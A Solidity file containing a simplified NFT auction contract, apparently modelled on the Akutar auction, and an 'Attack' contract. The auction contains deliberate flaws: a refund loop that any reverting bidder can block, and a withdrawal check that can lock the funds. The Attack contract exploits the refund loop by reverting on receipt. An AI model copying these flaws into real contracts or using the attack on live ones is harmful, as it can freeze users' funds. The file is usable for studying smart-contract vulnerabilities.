pragma solidity >0.8.0;




contract AkuAuction {
    address owner;
    address project;
    uint256 public maxNFTs = 15000;
    uint256 y=0;
    uint256 public totalForAuction = 5495; //529 + 2527 + 6449

    struct bids {
        address bidder;
        uint256 price;
        uint8 finalProcess; //0: Not processed, 1: refunded, 2: withdrawn
    }

    uint256 public price;
    uint256 public fee;
    uint256 public expiresAt;
    mapping(address=>uint256) public mintPassOwner;
    uint256 public constant mintPassDiscount = 0.5 ether;
    mapping(address => uint256) public personalBids;
    mapping(uint256 => bids) public allBids;
    uint256 public bidIndex = 1;
    uint256 public totalBids;
    uint256 public refundProgress = 1;
    bool public claimedProject=false;
    modifier onlyOwner(){
        require(owner==msg.sender);
        _;
    }
    constructor(address _project,uint256 _price,uint256 _fee)
    {
        owner=msg.sender;
        price=_price;
        fee=_fee;
        project=_project;

 
    }


    receive() external payable {
        revert("Please use the bid function");
    }

    function getTotalBids() public view returns (uint256){
        return totalBids;
    }
    function getBidIndex(address a) public view returns (uint256){
        return personalBids[a];
    }
    function getRefundProgess() public view returns (uint256){
        return refundProgress;
    }
    function getBidInx() public view returns (uint256){
        return bidIndex;
    }

    function bid_(uint8 amount)payable public {
        require (amount>0);
        uint256 totalPrice = (price + fee)* amount;
        if (msg.value< totalPrice) {
            revert("Bid not high enough");
        }


        uint256 myBidIndex = personalBids[msg.sender];
        bids memory myBids;

        if (myBidIndex > 0) {
            myBids= allBids[myBidIndex]; 
        } else {
            myBids.bidder = msg.sender;
            myBids.price=amount*price;
            myBids.finalProcess=0;
            personalBids[msg.sender] = bidIndex;
            allBids[bidIndex] = myBids;

            bidIndex++;
        }
        totalBids=totalBids+amount;
    
    }


    function processRefunds() public {
        require(refundProgress < bidIndex, "Refunds already processed");
        y=0;
        for (uint256 i=refundProgress ; i < bidIndex; i++) {
          bids memory bidData = allBids[i];
          if (bidData.finalProcess == 0) {
            uint256 refund = (bidData.price);
            allBids[i].finalProcess = 1;
            address to= bidData.bidder;
            (bool sent, ) = to.call{value: refund}("");
            require(sent, "Failed to refund bidder");
          }
          refundProgress++;
        y++;
        } 
        

    }

    function getClaimedProject() public view returns (bool) {
        return claimedProject;
    }

    function claimProjectFunds() external onlyOwner {
        if(refundProgress == totalBids){
            claimedProject=true;
            ( bool sent, ) = project.call{value: address(this).balance}("");
            require(sent, "Failed to withdraw");    

        }
         
    }


}

contract Attack {
    AkuAuction Aku;
    constructor (address payable aku){
        Aku= AkuAuction(aku);
    }
    receive() external payable {
        revert("Please use the bid function");
    }

    function attack() external {
        Aku.bid_(2);
    }

}